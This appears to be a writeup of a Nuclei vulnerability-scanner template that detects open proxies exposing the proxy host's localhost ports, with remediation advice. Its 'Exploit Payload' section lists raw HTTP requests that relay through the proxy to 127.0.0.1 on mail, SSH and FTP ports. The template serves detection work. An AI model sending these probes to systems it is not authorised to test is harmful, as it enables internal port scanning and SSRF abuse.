# Nuclei Template: Open Proxy to Ports on the Proxy's localhost Interface
**Template ID:** open-proxy-portscan
**Vulnerability Class:** Server-Side Request Forgery (SSRF)
**Severity:** High
**CWE:** CWE-441
**Source:** Nuclei Template (`open-proxy-portscan.yaml`)

## Vulnerability Information & PoC

## Description
The host is configured as a proxy which allows access to its internal interface

## Steps to reproduce / Exploit Payload
```http
GET / HTTP/1.1
Host: {{Hostname}}

GET http://somethingelsethatdoesnotexist/ HTTP/1.1
Host: somethingelsethatdoesnotexist

GET http://127.0.0.1:21 HTTP/1.1
Host: 127.0.0.1

GET http://127.0.0.1:22 HTTP/1.1
Host: 127.0.0.1

GET http://127.0.0.1:25 HTTP/1.1
Host: 127.0.0.1

GET http://127.0.0.1:110 HTTP/1.1
Host: 127.0.0.1

GET http://127.0.0.1:587 HTTP/1.1
Host: 127.0.0.1

GET https://127.0.0.1:587 HTTP/1.1
Host: 127.0.0.1
```

## Remediation
Disable the proxy or restrict configuration to only allow access to approved hosts/ports.

## References
- https://blog.projectdiscovery.io/abusing-reverse-proxies-internal-access/
- https://en.wikipedia.org/wiki/Open_proxy
- https://www.acunetix.com/vulnerabilities/web/apache-configured-to-run-as-proxy/
